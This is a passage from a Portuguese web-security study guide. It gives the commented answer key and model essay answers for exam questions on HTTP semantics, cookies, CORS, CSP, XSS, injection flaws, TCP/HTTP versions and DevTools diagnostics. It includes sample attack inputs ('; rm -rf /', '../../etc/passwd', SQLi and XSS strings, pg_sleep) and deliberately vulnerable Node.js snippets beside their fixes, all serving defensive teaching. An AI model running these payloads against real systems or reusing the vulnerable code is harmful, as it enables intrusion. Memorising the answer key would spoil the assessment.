- **Por que a `E` está correta:** Analisando os dois testes e a fronteira entre caixa-preta e caixa-branca ([Seção 3.5](./03a-vulnerabilidades-parte1.md#s3-5), [Seção 3.9](./03a-vulnerabilidades-parte1.md#s3-9) e [Seção 6.4](./06-checklist-e-comparativo.md#s6-4)):
  1. **Teste 1 — BOLA / IDOR:** Ao trocar `aluno_id=501` por `502` e obter `200 OK` com dados de terceiros, comprova-se que o servidor valida apenas se o usuário está autenticado, mas não verifica no banco se o usuário logado tem permissão sobre o objeto `502`.
  2. **Teste 2 — Mass Assignment (BOPLA):** Ao injetar `"perfil": "coordenador"` no corpo JSON do `PATCH` e conseguir escalar privilégios, comprova-se que o back-end faz *binding* direto do JSON da requisição para a entidade do banco (`Object.assign(usuario, req.body)` ou similar) sem filtrar os campos permitidos via DTO/*allowlist*.
  3. **Limitação Caixa-Preta ([Seção 6.4](./06-checklist-e-comparativo.md#s6-4)):** Pelo navegador (DevTools), vemos apenas o tráfego cliente-servidor e o estado no cliente. Se o servidor nunca retornar o hash da senha na resposta HTTP, é impossível saber apenas pelo DevTools se o banco de dados guarda senhas com `Argon2id` ou em texto plano, exigindo revisão de código/banco (caixa-branca).
- **Análise das incorretas (`A`, `B`, `C`, `D`):** Classificam incorretamente as vulnerabilidades e atribuem ao DevTools capacidades impossíveis ou negam funcionalidades básicas que ele possui.

---

<a id="s9-5-5"></a>
#### 9.5.5 Resolução Comentada: Verdadeiro ou Falso (Questões 31 a 45)

##### Resolução da Questão 31 — Gabarito: `(V)` Verdadeira
- **Justificativa técnica:** Conforme a **RFC 9110 (Seção 9.2)** ([Seção 1.4](./01a-fundamentos-web-parte1.md#s1-4)), um método HTTP é **seguro** (*safe*) quando sua semântica é essencialmente de somente leitura (`GET`, `HEAD`, `OPTIONS`, `TRACE`). Um método é **idempotente** quando múltiplas requisições idênticas produzem o mesmo efeito no estado do servidor que uma única requisição (`GET`, `HEAD`, `OPTIONS`, `TRACE`, `PUT` e `DELETE`). O método `POST` (e o `PATCH`) **não** é seguro nem idempotente (enviar dois `POST /pedidos` cria dois pedidos distintos).

##### Resolução da Questão 32 — Gabarito: `(F)` Falsa
- **Justificativa técnica:** Como o usuário **já está autenticado** (o servidor sabe que ele é um "Vendedor"), mas não possui **autorização** (permissão de perfil) para acessar a folha de pagamento da diretoria, o código de status HTTP correto é o **`403 Forbidden`**, e não o `401 Unauthorized` ([Seção 1.5.2](./01a-fundamentos-web-parte1.md#s1-5)).

##### Resolução da Questão 33 — Gabarito: `(V)` Verdadeira
- **Justificativa técnica:** A flag `HttpOnly` ([Seção 2.2.6](./02b-devtools-application.md#s2-2-6)) bloqueia exclusivamente o acesso ao cookie via APIs de script no cliente (`document.cookie`), protegendo contra o roubo direto do cookie por **XSS**. Contudo, em um ataque de **CSRF** ([Seção 3.3](./03a-vulnerabilidades-parte1.md#s3-3)), o script ou formulário na página do atacante não tenta ler o cookie: ele apenas dispara uma requisição HTTP para o servidor vulnerável, e o próprio navegador anexa o cookie (mesmo sendo `HttpOnly`) se o atributo `SameSite` e tokens anti-CSRF não impedirem a operação.

##### Resolução da Questão 34 — Gabarito: `(F)` Falsa
- **Justificativa técnica:** O protocolo **HTTPS (HTTP sobre TLS)** ([Seção 1.3.6](./01a-fundamentos-web-parte1.md#s1-3-6) e [Seção 4.6.4](./04-redes-de-computadores.md#s4-6-4)) garante confidencialidade, integridade e autenticidade **em trânsito** (protegendo contra interceptação *Man-in-the-Middle* na rede). Ele **não** inspeciona nem sanitiza a lógica da aplicação: um payload de *SQL Injection* (`' OR '1'='1`) ou de *XSS* (`<script>alert(1)</script>`) será criptografado com perfeição pelo TLS 1.3 no navegador, descriptografado no servidor web e executado normalmente contra o banco de dados ou refletido para a vítima.

##### Resolução da Questão 35 — Gabarito: `(F)` Falsa
- **Justificativa técnica:** A afirmação descreve o comportamento do **`localStorage`**, e não do `sessionStorage`. O `sessionStorage` ([Seção 1.12.2](./01b-fundamentos-web-parte2.md#s1-12-2) e [Seção 2.2.3](./02b-devtools-application.md#s2-2-3)) é estritamente isolado por aba (*top-level browsing context*) e seus dados são apagados assim que a aba ou o navegador é fechado.

##### Resolução da Questão 36 — Gabarito: `(V)` Verdadeira
- **Justificativa técnica:** Um **JWT** no formato padrão **JWS** (*JSON Web Signature* — RFC 7515 / RFC 7519 — [Seção 1.7.3](./01b-fundamentos-web-parte2.md#s1-7-3)) garante **integridade e autenticidade** por meio da assinatura digital ou MAC, mas **não confidencialidade**. As duas primeiras partes (`header` e `payload`) são apenas strings JSON convertidas para **Base64URL**. Qualquer pessoa com acesso ao token pode executar `atob()` no Console do DevTools e ler todo o conteúdo do payload. **[REQUISITO]**: Nunca colocar senhas, hashes de senha, chaves secretas ou dados sensíveis desnecessários dentro do payload de um JWS (caso a confidencialidade do token seja exigida, deve-se usar **JWE** — *JSON Web Encryption* — ou tokens opacos).

##### Resolução da Questão 37 — Gabarito: `(F)` Falsa
- **Justificativa técnica:** Pela **Same-Origin Policy (SOP)** ([Seção 1.11.1](./01b-fundamentos-web-parte2.md#s1-11-1)), duas URLs só possuem a mesma origem quando coincidem exatamente na tripla **`(esquema, host, porta)`**. Como a primeira URL usa esquema `https` e porta `443` e a segunda usa esquema `http` e porta `80`, elas são consideradas de **origens diferentes** (*cross-origin*).

##### Resolução da Questão 38 — Gabarito: `(V)` Verdadeira
- **Justificativa técnica:** Na aba **Network > Timing** ([Seção 2.1.6](./02a-devtools-network.md#s2-1-6)), `Waiting for server response (TTFB)` mede a espera até o primeiro byte chegar do servidor, enquanto `Content Download` mede o tempo para transferir o restante do corpo da resposta. Um TTFB de `4.200 ms` com `Content Download` de `2 ms` prova que a resposta é pequena e rápida de baixar, mas o servidor demorou mais de 4 segundos para processá-la e iniciar o envio.

##### Resolução da Questão 39 — Gabarito: `(F)` Falsa
- **Justificativa técnica:** Por segurança, o padrão Fetch/CORS ([Seção 1.11.2](./01b-fundamentos-web-parte2.md#s1-11-2) e [Seção 5.11](./05-headers-de-seguranca.md#s5-11)) proíbe estritamente a combinação de `Access-Control-Allow-Origin: *` com requisições credenciadas (`credentials: 'include'` / `Access-Control-Allow-Credentials: true`). O navegador bloqueia a leitura da resposta e dispara um erro de CORS no Console.

##### Resolução da Questão 40 — Gabarito: `(V)` Verdadeira
- **Justificativa técnica:** A **RFC 1918** ([Seção 4.4.2](./04-redes-de-computadores.md#s4-4-2)) define exatamente os três blocos de endereços IPv4 privados: Classe A (`10.0.0.0/8` — `10.0.0.0` a `10.255.255.255`), Classe B (`172.16.0.0/12` — `172.16.0.0` a `172.31.255.255`) e Classe C (`192.168.0.0/16` — `192.168.0.0` a `192.168.255.255`). Para se comunicarem com a Internet pública, os roteadores de borda aplicam **NAT / PAT** ([Seção 4.5.4](./04-redes-de-computadores.md#s4-5-4)).

##### Resolução da Questão 41 — Gabarito: `(V)` Verdadeira
- **Justificativa técnica:** Nas especificações CSP Nível 2 e Nível 3 ([Seção 5.1](./05-headers-de-seguranca.md#s5-1)), a presença de um `'nonce-...'` ou de um hash `'sha256-...'` na diretiva `script-src` faz com que os navegadores modernos **ignorem automaticamente** a palavra-chave `'unsafe-inline'`, garantindo proteção real contra XSS inline sem quebrar a retrocompatibilidade sintática com navegadores legados.

##### Resolução da Questão 42 — Gabarito: `(V)` Verdadeira
- **Justificativa técnica:** O cabeçalho **`Clear-Site-Data`** ([Seção 2.2.1](./02b-devtools-application.md#s2-2-1)) é o mecanismo padronizado pelo W3C para que o servidor ordene ao navegador a limpeza imediata de cookies (`"cookies"`), armazenamentos locais como `localStorage`, `sessionStorage` e `IndexedDB` (`"storage"`) e caches (`"cache"`), exatamente como faz o botão manual **Clear site data** na aba **Application > Storage** do DevTools.

##### Resolução da Questão 43 — Gabarito: `(F)` Falsa
- **Justificativa técnica:** Segundo a **RFC 6797 (Seção 8.1)** ([Seção 5.2](./05-headers-de-seguranca.md#s5-2)), um navegador **deve ignorar** o cabeçalho `Strict-Transport-Security` se ele for recebido sobre HTTP não criptografado (`http://`) ou sobre uma conexão TLS com erros de validação de certificado; caso contrário, um atacante *Man-in-the-Middle* na rede local poderia injetar um header HSTS malicioso em uma conexão HTTP para causar negação de serviço em domínios que não suportam HTTPS.

##### Resolução da Questão 44 — Gabarito: `(V)` Verdadeira
- **Justificativa técnica:** Na **RFC 9110 (Seção 15.4)** ([Seção 1.5.2](./01a-fundamentos-web-parte1.md#s1-5)), os códigos `307 Temporary Redirect` e `308 Permanent Redirect` foram criados especificamente para corrigir a ambiguidade histórica do `302` e do `301`: no `307` e no `308`, o agente de usuário **não deve** alterar o método HTTP (um `POST` continua sendo `POST`) nem descartar o corpo ao seguir o redirecionamento.

##### Resolução da Questão 45 — Gabarito: `(F)` Falsa
- **Justificativa técnica:** Conforme as **RFCs 1034/1035 e RFC 7766** ([Seção 1.3.1](./01a-fundamentos-web-parte1.md#s1-3-1), [Seção 4.5.3](./04-redes-de-computadores.md#s4-5-3) e [Seção 4.7](./04-redes-de-computadores.md#s4-7)), o DNS utiliza a porta **53/UDP** para consultas padrão rápidas, mas utiliza obrigatoriamente a porta **53/TCP** quando a resposta excede o tamanho negociado no UDP (recebendo a flag `TC=1` — *Truncated* — e refazendo a consulta via TCP) e para **transferências de zona (`AXFR` / `IXFR`)** entre servidores DNS primários e secundários.


---

<a id="s9-5-6"></a>
#### 9.5.6 Padrão de Resposta da Banca: Questões Discursivas (Questões 46 a 55)

##### Padrão de Resposta da Questão 46 (Arquitetura de Sessão: Cookies `HttpOnly` vs `localStorage` vs `sessionStorage` e JWT)
1. **Diferença entre `localStorage` e `sessionStorage` ([Seção 1.12](./01b-fundamentos-web-parte2.md#s1-12) e [Seção 2.2.3](./02b-devtools-application.md#s2-2-3)):**
   - **`localStorage`:** Armazenamento chave-valor síncrono em string (~5 MB por origem) com **persistência indefinida em disco**. Os dados sobrevivem ao fechamento da aba, encerramento do navegador e reinicialização do sistema operacional, sendo compartilhados entre todas as abas e janelas de mesma origem (`esquema + host + porta`).
   - **`sessionStorage`:** Armazenamento chave-valor síncrono em string restrito ao **contexto de navegação de topo (*top-level browsing context* — a aba atual)**. Se o usuário abrir outra aba para o mesmo site, um novo `sessionStorage` independente é criado, e todos os dados são destruídos assim que a aba é fechada.
2. **Risco de armazenar JWT no `localStorage` ou `sessionStorage` ([Seção 1.7.3](./01b-fundamentos-web-parte2.md#s1-7-3)):**
   - Ambos são completamente expostos ao JavaScript via `window.localStorage` e `window.sessionStorage`. Caso a aplicação sofra qualquer vulnerabilidade de **Cross-Site Scripting (XSS)** — seja no próprio código front-end ou em um script de terceiro/CDN comprometido —, o atacante executa `localStorage.getItem('jwt')` e exfiltra o token para um servidor externo, podendo personificar o usuário de qualquer lugar até a expiração do token.
3. **O que significa um cookie sem `HttpOnly` e papel dos atributos de proteção ([Seção 2.2.5](./02b-devtools-application.md#s2-2-5) e [Seção 2.2.6](./02b-devtools-application.md#s2-2-6)):**
   - Um cookie **sem `HttpOnly`** pode ser lido e modificado por scripts no cliente via `document.cookie`, ficando tão vulnerável ao roubo via XSS quanto o `localStorage`.
   - **`HttpOnly`:** Torna o cookie invisível ao `document.cookie`, impedindo que um script XSS leia o valor do token.
   - **`Secure`:** Garante que o cookie só seja transmitido sobre conexões criptografadas **HTTPS**.
   - **`SameSite` (`Strict` ou `Lax`):** Controla o envio do cookie em requisições cross-site (`Strict` nunca envia cross-site; `Lax` envia apenas em navegações *top-level* seguras como `GET`).
   - **Prefixo `__Host-`:** Obriga `Secure`, `Path=/` e proíbe o atributo `Domain`, vinculando o cookie estritamente ao host exato e prevenindo *cookie tossing* por subdomínios.
4. **Risco de CSRF em Cookies e Arquitetura Recomendada para a SPA Bancária ([RECOMENDAÇÃO]):**
   - Como os cookies são enviados automaticamente pelo navegador em requisições para a origem, eles requerem defesa contra **CSRF** (*Cross-Site Request Forgery* — [Seção 3.3](./03a-vulnerabilidades-parte1.md#s3-3)).
   - **Arquitetura recomendada (Padrão BFF — *Backend For Frontend* ou Cookie Seguro + Token em Memória):** Emitir o token de sessão ou *Refresh Token* (com rotação e detecção de reuso) exclusivamente em um cookie **`__Host-session=...; Secure; HttpOnly; SameSite=Strict; Path=/`**, combinado a um token anti-CSRF (ou cabeçalho customizado validado no servidor, que não pode ser enviado cross-origin sem preflight CORS) e manter eventuais *Access Tokens* de curtíssima duração (ex.: 5 minutos) apenas em variáveis JavaScript na memória RAM (fechamento/*closure*), jamais no `localStorage`.

##### Padrão de Resposta da Questão 47 (Semântica HTTP: `200`, `401`, `403` e `500`)
1. **Significado técnico dos códigos ([Seção 1.5.2](./01a-fundamentos-web-parte1.md#s1-5)):**
   - **`200 OK`:** Requisição processada com êxito; o corpo da resposta contém a representação solicitada ou o resultado da operação.
   - **`401 Unauthorized`:** Falha de **autenticação**. O cliente não forneceu credenciais ou forneceu um token/sessão inválido ou expirado. Deve incluir o header `WWW-Authenticate`.
   - **`403 Forbidden`:** Falha de **autorização**. O servidor entendeu o pedido e identificou o usuário, mas suas permissões são insuficientes para o recurso.
   - **`500 Internal Server Error`:** Falha inesperada no servidor (exceção não tratada, queda de banco de dados ou erro de programação no back-end).
2. **Diferença entre Autenticação (`401`) e Autorização (`403`) ([Seção 1.7.4](./01b-fundamentos-web-parte2.md#s1-7-4)):**
   - **Autenticação (*Authentication — AuthN*):** Processo de verificar a identidade de quem faz a requisição (ex.: validar login/senha ou assinatura e expiração de um JWT). Se falhar $\rightarrow$ `401`.
   - **Autorização (*Authorization — AuthZ*):** Processo de verificar se a identidade já autenticada possui permissão (RBAC/ABAC/propriedade do objeto) para executar aquela ação naquele recurso. Se falhar $\rightarrow$ `403`.
3. **Quando retornar `404 Not Found` em vez de `403 Forbidden` ([BOA PRÁTICA]):**
   - Conforme a própria **RFC 9110 (Seção 15.5.4)** e as diretrizes da OWASP contra **IDOR / Enumeração**, quando o servidor não deseja revelar sequer que um recurso privado existe (por exemplo, `GET /api/documentos-secretos/9821`), retornar `403 Forbidden` confirma ao atacante que o documento `9821` existe no banco, enquanto `404 Not Found` oculta sua existência.
4. **Riscos do anti-padrão `200 OK` com erro e de `500` prolixo ([Seção 3.7](./03a-vulnerabilidades-parte1.md#s3-7)):**
   - Retornar `200 OK` para erros de login/sistema quebra a semântica HTTP, engana sistemas de monitoramento/WAF, pode fazer CDNs/navegadores armazenarem mensagens de erro em cache e dificulta o tratamento padronizado no cliente.
   - Retornar *stack traces*, consultas SQL e caminhos internos do servidor em respostas `500` constitui **Security Misconfiguration / Information Disclosure**, fornecendo ao invasor o mapa exato do banco de dados e das bibliotecas internas para explorar SQL Injection ou RCE.

##### Padrão de Resposta da Questão 48 (Same-Origin Policy, CORS e `Access-Control-Allow-Origin`)
1. **Same-Origin Policy (SOP) ([Seção 1.11.1](./01b-fundamentos-web-parte2.md#s1-11-1)):**
   - É o pilar central de isolamento dos navegadores web, que impede que documentos ou scripts carregados de uma origem leiam arbitrariamente os dados de outra origem.
   - Uma **origem** é definida pela tripla exata: **`esquema (protocolo) + host (domínio) + porta`** (ex.: `https://app.exemplo.test:443`).
   - Em regra, a SOP permite escritas cross-origin simples (*cross-origin writes*, como links e formulários — daí o risco de CSRF) e incorporações (*cross-origin embeds*, como `<script>`, `<img>`, `<iframe>`), mas **bloqueia leituras cross-origin (*cross-origin reads*)** via JavaScript (`fetch` / `XHR`).
2. **Significado de `Access-Control-Allow-Origin: *` ([Seção 1.11.2](./01b-fundamentos-web-parte2.md#s1-11-2) e [Seção 5.10](./05-headers-de-seguranca.md#s5-10)):**
   - Autoriza o navegador a liberar a leitura da resposta para scripts de **qualquer origem**, mas somente para **recursos públicos que não dependam de credenciais** (como APIs abertas de clima, fontes web ou arquivos em CDNs públicas).
   - Os navegadores bloqueiam a combinação `Access-Control-Allow-Origin: *` com `Access-Control-Allow-Credentials: true` (`credentials: 'include'`) para impedir que desenvolvedores exponham acidentalmente endpoints autenticados por cookies para toda a Internet.
3. **Vulnerabilidade da reflexão arbitrária de `Origin` com `Access-Control-Allow-Credentials: true` ([Seção 1.11.3](./01b-fundamentos-web-parte2.md#s1-11-3) e [Seção 5.11](./05-headers-de-seguranca.md#s5-11)):**
   - Se o servidor simplesmente copiar o valor do header `Origin` da requisição para o header `Access-Control-Allow-Origin` junto com `Access-Control-Allow-Credentials: true`, qualquer site malicioso (`https://atacante.test`) visitado pela vítima poderá fazer requisições autenticadas e ler os dados privados retornados pela API.
4. **Implementação segura no back-end e papel do `Vary: Origin`:**
   - **[REQUISITO]**: Manter no servidor uma **lista de permissões estrita (*allowlist*)** de origens confiáveis exatas (ex.: `const ALLOWED = new Set(['https://app.exemplo.test', 'https://admin.exemplo.test'])`). Só enviar `Access-Control-Allow-Origin: <origin>` se `ALLOWED.has(req.headers.origin)` for verdadeiro.
   - **[REQUISITO]**: Sempre que o valor de `Access-Control-Allow-Origin` variar dinamicamente conforme a origem da requisição, o servidor **deve** incluir `Vary: Origin` na resposta para impedir que caches intermediários (CDNs/Proxies) entreguem o cabeçalho gerado para a Origem A em uma resposta destinada à Origem B.

##### Padrão de Resposta da Questão 49 (Defesa em Profundidade contra XSS e Função do CSP)
1. **Definição e categorias de XSS ([Seção 3.2](./03a-vulnerabilidades-parte1.md#s3-2)):**
   - O **Cross-Site Scripting (XSS)** ocorre quando uma aplicação inclui dados não confiáveis em uma página web sem validação ou escape adequados, levando o navegador da vítima a executar código JavaScript controlado pelo atacante.
   - **XSS Refletido:** O payload malicioso vem na própria requisição HTTP (ex.: parâmetro de busca na URL `?erro=<script>...`) e é refletido imediatamente na resposta HTML gerada pelo servidor.
   - **XSS Armazenado (Persistente):** O payload é gravado de forma persistente no servidor (ex.: comentário em fórum, nome de perfil no banco de dados) e servido posteriormente a todos os usuários que visualizarem aquela página.
   - **XSS Baseado em DOM (*DOM-Based*):** A vulnerabilidade reside no código JavaScript do cliente, que lê dados de uma **fonte (*source*)** controlável (como `location.search`, `location.hash`, `window.name` ou `postMessage`) e os passa de forma insegura para um **sumidouro (*sink*)** de execução ou renderização HTML (como `innerHTML`, `outerHTML`, `document.write()`, `eval()`).
2. **Defesas primárias no código ([Seção 1.8.3](./01b-fundamentos-web-parte2.md#s1-8-3) e [Seção 1.9.1](./01b-fundamentos-web-parte2.md#s1-9-1)):**
   - **[REQUISITO]**: Aplicar **Codificação Contextual de Saída (*Contextual Output Encoding*)** ao renderizar no servidor (convertendo `<`, `>`, `&`, `"`, `'` em `&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;` no contexto HTML).
   - **[REQUISITO]**: No JavaScript do cliente, usar **`textContent`** ou `setAttribute` (para atributos seguros) em vez de `innerHTML`. Quando for estritamente necessário renderizar HTML rico fornecido pelo usuário, sanitizá-lo previamente com uma biblioteca robusta como **`DOMPurify.sanitize(html)`**, aliado à API **Trusted Types** (`require-trusted-types-for 'script'`).
3. **Função do Content Security Policy (CSP) e política baseada em `nonce` ([Seção 5.1](./05-headers-de-seguranca.md#s5-1)):**
   - O CSP funciona como segunda linha de defesa (*mitigação de impacto*): caso um payload XSS passe pela sanitização, o navegador recusa-se a executar o script não autorizado.
   - Políticas com `'unsafe-inline'` permitem a execução de `<script>...</script>` injetados, e políticas com `'unsafe-eval'` permitem `eval()`. Listas amplas de domínios falham se um dos domínios hospedar arquivos de usuários ou bibliotecas JSONP antigas.
   - **Exemplo de CSP estrito moderno ([RECOMENDAÇÃO]):**
     ```http
     Content-Security-Policy: default-src 'none'; script-src 'nonce-R4nd0mCript0gr4fic0Unic0PorReq' 'strict-dynamic'; style-src 'self'; img-src 'self' data:; connect-src 'self' https://api.exemplo.test; font-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'; upgrade-insecure-requests;
     ```

##### Padrão de Resposta da Questão 50 (SQL Injection, Command Injection e Path Traversal com Código Seguro)
1. **Causa-raiz comum ([Seção 3.1](./03a-vulnerabilidades-parte1.md#s3-1), [Seção 3.16](./03b-vulnerabilidades-parte2.md#s3-16) e [Seção 3.17](./03b-vulnerabilidades-parte2.md#s3-17)):**
   - Nas três vulnerabilidades, a aplicação concatena dados brutos fornecidos pelo usuário diretamente em uma string que será interpretada por um subsistema privilegiado: o interpretador **SQL** do banco de dados (SQLi), o **shell do sistema operacional** (`/bin/sh` ou `cmd.exe` no Command Injection) ou o **resolvedor de caminhos do sistema de arquivos** (Path Traversal).
2. **Exemplos de Código Vulnerável vs. Código Corrigido (Node.js):**
   - **A) SQL Injection (CWE-89):**
     ```javascript
     // INSEGURO (Concatenação direta):
     const res = await db.query(`SELECT * FROM produtos WHERE categoria = '${req.query.cat}'`);

     // SEGURO ([REQUISITO] — Prepared Statement / Consulta Parametrizada):
     const res = await db.query('SELECT id, nome, preco FROM produtos WHERE categoria = $1', [req.query.cat]);
     ```
   - **B) OS Command Injection (CWE-78):**
     ```javascript
     // INSEGURO (exec invoca o shell /bin/sh, permitindo "; rm -rf /" ou "&& whoami"):
     const { exec } = require('node:child_process');
     exec(`ping -c 4 ${req.body.host}`, (err, stdout) => res.send(stdout));

     // SEGURO ([REQUISITO] — Usar execFile sem shell, com array de argumentos e validação por regex estrita):
     const { execFile } = require('node:child_process');
     const host = String(req.body.host || '');
     if (!/^[a-zA-Z0-9.-]{1,64}$/.test(host)) return res.status(400).json({ erro: 'Host inválido' });
     execFile('/bin/ping', ['-c', '4', host], { timeout: 5000, shell: false }, (err, stdout) => {
       if (err) return res.status(500).json({ erro: 'Falha ao executar diagnóstico' });
       res.type('text/plain').send(stdout);
     });
     ```
   - **C) Path Traversal (CWE-22):**
     ```javascript
     // INSEGURO (Concatenação de caminho permitindo "../../../../etc/passwd"):
     const fs = require('node:fs');
     const path = require('node:path');
     const conteudo = fs.readFileSync('/var/app/relatorios/' + req.query.arquivo, 'utf8');

     // SEGURO ([REQUISITO] — Canonicalização com path.resolve e verificação estrita do diretório base):
     const BASE_DIR = path.resolve('/var/app/relatorios');
     const nomeLimpo = path.basename(String(req.query.arquivo || ''));
     const caminhoFinal = path.resolve(BASE_DIR, nomeLimpo);
     if (!caminhoFinal.startsWith(BASE_DIR + path.sep)) {
       return res.status(403).json({ erro: 'Acesso negado fora do diretório permitido' });
     }
     const conteudoSeguro = fs.readFileSync(caminhoFinal, 'utf8');
     ```

##### Padrão de Resposta da Questão 51 (Redes: TCP vs. UDP, Three-Way Handshake e HTTP/1.1, HTTP/2 e HTTP/3)
1. **Comparativo TCP vs. UDP ([Seção 1.3.3](./01a-fundamentos-web-parte1.md#s1-3-3), [Seção 1.3.4](./01a-fundamentos-web-parte1.md#s1-3-4) e [Seção 4.3.1](./04-redes-de-computadores.md#s4-3-1)):**
   - **TCP (RFC 9293):** Orientado a conexão, confiável (confirmações `ACK` e retransmissão automática), entrega ordenada em fluxo de bytes (*byte stream*), controle de fluxo por janela deslizante (*Window Size*) e controle de congestionamento, cabeçalho de 20 a 60 bytes. Uso: HTTP/1.1, HTTP/2, SSH, SMTP, bancos de dados.
   - **UDP (RFC 768):** Sem conexão (*connectionless*), entrega não garantida (*best-effort*), sem ordenação nem retransmissão na camada 4, cabeçalho fixo mínimo de 8 bytes, baixíssima latência e *overhead*. Uso: DNS padrão (53/UDP), DHCP, streaming de áudio/vídeo, WebRTC e transporte para o protocolo **QUIC** (HTTP/3).
2. **Three-Way Handshake do TCP, SYN Flood e SYN Cookies ([Seção 4.3.2](./04-redes-de-computadores.md#s4-3-2)):**
   - **Passo 1 (`SYN`):** O cliente envia um segmento com a flag `SYN=1` e escolhe um número de sequência inicial aleatório `Seq = X`.
   - **Passo 2 (`SYN-ACK`):** O servidor responde com as flags `SYN=1, ACK=1`, confirmando `Ack = X + 1` e escolhendo seu próprio número de sequência inicial `Seq = Y`.
   - **Passo 3 (`ACK`):** O cliente envia `ACK=1` com `Seq = X + 1` e `Ack = Y + 1`. A conexão entra no estado `ESTABLISHED`.
   - **SYN Flood e Defesa:** No *SYN Flood*, o atacante envia milhares de pacotes `SYN` com IPs de origem falsificados e nunca responde ao `SYN-ACK`, esgotando a fila de conexões semiabertas (`SYN_RCVD`) do servidor. A defesa padrão utiliza **SYN Cookies**, em que o servidor codifica criptograficamente os metadados da conexão no próprio número de sequência `Y` do `SYN-ACK` e só aloca memória quando recebe o `ACK` final válido.
3. **Evolução HTTP/1.1 $\rightarrow$ HTTP/2 $\rightarrow$ HTTP/3 e Fim do HoL Blocking ([Seção 1.3.5](./01a-fundamentos-web-parte1.md#s1-3-5) e [Seção 2.1.7](./02a-devtools-network.md#s2-1-7)):**
   - No **HTTP/1.1**, as requisições em uma mesma conexão TCP precisavam ser processadas em série (*Head-of-Line Blocking* na camada de aplicação), obrigando os navegadores a abrirem até 6 conexões TCP paralelas por domínio.
   - O **HTTP/2 (`h2`)** introduziu a camada binária de *framing*, compressão de cabeçalhos `HPACK` e **multiplexação** de dezenas de requisições simultâneas em uma única conexão TCP. Isso resolveu o HoL Blocking do HTTP, mas manteve o **HoL Blocking do TCP**: se 1 pacote TCP se perde na rede, o sistema operacional retém todos os fluxos HTTP/2 até a retransmissão daquele pacote.
   - O **HTTP/3 (`h3`)** opera sobre o protocolo **QUIC** (em cima de **UDP**), que gerencia fluxos (*streams*) independentes e incorpora o **TLS 1.3** nativamente dentro do próprio handshake de transporte, completando conexão + criptografia em apenas **1-RTT** (ou **0-RTT** em retomadas) e garantindo que a perda de um pacote UDP trave apenas o fluxo específico a que aquele pacote pertencia.

##### Padrão de Resposta da Questão 52 (DevTools Network: HTTPS, Fases de Timing e Diagnóstico de TTFB Alto)
1. **Comprovação de HTTPS na Aba Network ([Seção 2.1.4](./02a-devtools-network.md#s2-1-4) e [Seção 6.1.1](./06-checklist-e-comparativo.md#s6-1-1)):**
   - Habilitar a coluna **`Scheme`** (deve exibir `https` para todos os recursos, sem itens `http` que caracterizariam *Mixed Content*), verificar a coluna **`Protocol`** (`h2`, `h3` ou `http/1.1` sobre TLS), observar a porta `:443` em **`Remote Address`**, verificar a presença da fase **`SSL`** na abertura da conexão em **Timing** e inspecionar a aba **Security** do DevTools para validar o certificado X.509, a Autoridade Certificadora e o protocolo `TLS 1.3`.
2. **Definição de TTFB e significado de todas as fases do painel Timing ([Seção 2.1.6](./02a-devtools-network.md#s2-1-6)):**
   - **Queueing:** Requisição na fila interna do navegador (aguardando liberação de socket, prioridade maior ou espaço no limite de 6 conexões do HTTP/1.1).
   - **Stalled:** Tempo em que a requisição ficou retida por negociação de proxy ou espera de reutilização de conexão.
   - **DNS Lookup:** Tempo para resolver o nome de domínio em endereço IP.
   - **Initial Connection:** Tempo gasto no *Three-Way Handshake* do TCP.
   - **SSL:** Tempo gasto na negociação criptográfica do *Handshake TLS*.
   - **Request Sent:** Tempo para transmitir os bytes da requisição HTTP na rede.
   - **Waiting for server response (TTFB — *Time To First Byte*):** Tempo entre o fim do envio da requisição e a chegada do primeiro byte da resposta HTTP (soma de 1 RTT de rede + tempo de processamento no back-end).
   - **Content Download:** Tempo gasto para baixar o corpo completo (*payload*) da resposta.
3. **Diagnóstico de TTFB de `8.000 ms` no endpoint de busca vs. `15 ms` nos ativos estáticos:**
   - Como os ativos estáticos da mesma origem têm TTFB de `15 ms`, descarta-se lentidão na rede física, no DNS ou no TLS do cliente: o gargalo está **exclusivamente no processamento da rota de busca no servidor back-end**.
   - **Hipóteses de Performance:** Consulta SQL sem índice (*Full Table Scan*), bloqueio de linhas (*database lock contention*), problema de *N+1 queries* no ORM ou chamada externa síncrona travada (timeout em API de terceiros).
   - **Hipóteses de Segurança:** Exploração de **Time-Based Blind SQL Injection** (onde um atacante injeta funções como `pg_sleep(8)` ou `SLEEP(8)` para inferir dados bit a bit pelo tempo de resposta), **ReDoS** (*Regular Expression Denial of Service* na validação do filtro) ou ataque de negação de serviço na camada de aplicação (Camada 7).

##### Padrão de Resposta da Questão 53 (APIs REST: BOLA/IDOR, Excessive Data Exposure e Mass Assignment)
1. **Como ocorrem as três vulnerabilidades ([Seção 1.10](./01b-fundamentos-web-parte2.md#s1-10), [Seção 3.5](./03a-vulnerabilidades-parte1.md#s3-5) e [Seção 3.9](./03a-vulnerabilidades-parte1.md#s3-9)):**
   - **BOLA / IDOR em `GET /api/v1/pedidos/9041`:** O servidor verifica que o usuário está logado, mas busca `SELECT * FROM pedidos WHERE id = 9041` sem checar `AND cliente_id = usuarioSessao.id`. Qualquer cliente autenticado pode enumerar `9040`, `9042`, etc., e acessar pedidos alheios.
   - **Excessive Data Exposure:** O endpoint serializa a entidade inteira do banco de dados no JSON de resposta (incluindo CPF, endereço completo, hash de senha ou dados internos do vendedor), confiando que o front-end exibirá apenas dois campos na tela.
   - **Mass Assignment em `PUT /api/v1/clientes/42`:** O servidor atualiza o registro passando `req.body` diretamente para o ORM (`Cliente.update(req.body)`), permitindo que o usuário envie propriedades privilegiadas ocultas como `{"saldo_credito": 99999, "is_admin": true}`.
2. **Identificação pelo Chrome DevTools ([Seção 2.1.9](./02a-devtools-network.md#s2-1-9) e [Seção 6.1.5](./06-checklist-e-comparativo.md#s6-1-5)):**
   - Na aba **Network**, inspeciona-se a sub-aba **Response / Preview** de `GET /api/v1/pedidos/9041` para detectar campos sensíveis extras que não aparecem no DOM (*Excessive Data Exposure*).
   - Usando *Copy as fetch* na aba **Network** e colando na aba **Console** (em ambiente de teste autorizado), altera-se o ID da URL para o ID de outra conta de teste para verificar se retorna `200 OK` (*BOLA/IDOR*), e adicionam-se campos administrativos no corpo JSON do `PUT` para verificar se o servidor os persiste (*Mass Assignment*).
3. **Arquitetura de Correção no Back-End ([REQUISITO]):**
